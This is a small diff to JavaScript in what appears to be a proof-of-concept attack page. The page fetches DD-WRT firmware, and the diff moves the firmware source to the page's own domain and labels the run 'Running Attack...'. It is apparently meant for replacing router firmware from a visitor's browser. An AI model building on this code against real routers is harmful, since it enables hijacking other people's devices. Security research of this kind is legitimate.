@@ -79,8 +79,10 @@
         var runningLog=document.getElementById("runningLog");
         /* filename of new firmware */
         var fileName = "dd-wrt.v24-12548_NEWD_mini.bin";
-        /* where the new firmware will be sourced */
-        var srcFile = "ftp://ftp.dd-wrt.com/others/eko/V24_TNG/svn12548/dd-wrt.v24-12548_NEWD_mini.bin";
+        /* the new firmware should be sourced from the same domain as this page, */
+        /* or have proper CORS permisisons */
+        /* DD-WRT firmware is available from http://www.dd-wrt.com/dd-wrtv2/downloads/others/eko/V24_TNG/svn12548/dd-wrt.v24-12548_NEWD_mini.bin */
+        var srcFile = "dd-wrt.v24-12548_NEWD_mini.bin";
         document.getElementById('start-button').innerText = "Running Attack...";
         document.getElementById('progress').style.visibility = "show";
         /* Generate the first XHR to access the new firmware */
